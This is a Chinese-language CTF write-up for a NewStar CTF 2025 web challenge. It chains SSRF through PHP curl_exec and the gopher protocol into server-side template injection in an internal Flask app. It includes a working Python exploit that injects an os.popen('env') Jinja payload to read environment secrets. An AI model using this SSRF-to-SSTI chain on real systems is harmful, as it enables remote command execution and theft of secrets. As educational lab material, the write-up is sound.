---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# SSTI 在哪里？

下载附件，我们能看到一个 web 网页访问为标题的网站

发现有一个可控参数 `url`，`curl_exec` 的参数可控，能够使用它去访问一些内部服务，web 中涉及到这一块，就必须去了解  `gopher` 协议。

gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合gopher 协议的请求。

在 gopher 协议中发送HTTP的数据，需要以下三步：

1、构造 HTTP 数据包

2、URL 编码、替换回车换行为 %0d%0a

3、发送 gopher 协议

注意 gopher 协议格式

```url
gopher://ip:port/_后接TCP数据流(就是经过上面1,2步后得到的数据)
```

然后还有两个 python 文件

```py
### app.py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/', methods=['GET','POST'])

def handle_request():
    
    name = request.form.get('name','')
    data = {"template":name}
    res = requests.post('http://localhost:5001/',data=data).text
    return res
    
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

```py
### internal_web.py
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route('/', methods=['GET','POST'])
def index():
    template = request.form.get('template', 'Hello World!')
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5001)
```

其中 internal\_web.py 使用 render\_template\_string 方法渲染，有 ssti 的风险，同时 template 是可控的，通过 post 请求，在请求体 template=xxxx。但是当前服务仅仅绑定在 127.0.0.1 ，外部无法访问，这里 app.py 中的代码给了可以进行本地访问的代码

```python
name = request.form.get('name','')
data = {"template":name}
res = requests.post('http://localhost:5001/',data=data).text
```

也就是我们只需要向 app.py 这个服务 post 传字段 name 即可。

理论上这个也不能被外部访问，但是 index.php 中的 curl\_exec 的滥用导致可以去访问内部的这些服务，控制 curl\_exec 的参数 $url ，使用 gopher 协议即可向 app.py 发送请求，使得其访问 internal\_web.py 拿到 flag。

```python
### exp.py
import urllib.parse
import requests
import re

payload = r'name={{lipsum.__globals__.os.popen("env").read()}}'
gopher_payload = (
    "POST / HTTP/1.1\r\n"
    "Host: 127.0.0.1:5000\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(payload)}\r\n"
    "\r\n"
    f"{payload}"
)
fin_payload = urllib.parse.quote(gopher_payload)
gopher_url = f"gopher://127.0.0.1:5000/_{fin_payload}"

print("生成的 gopher URL:")
print(gopher_url)
print()

res = requests.post("http://127.0.0.1:20001/",data={"url": gopher_url},timeout=1)
re_pattern = re.compile(r'ICQ_FLAG=(.*?)\n')
result = re_pattern.findall(res.text)[0]

print(result)
```
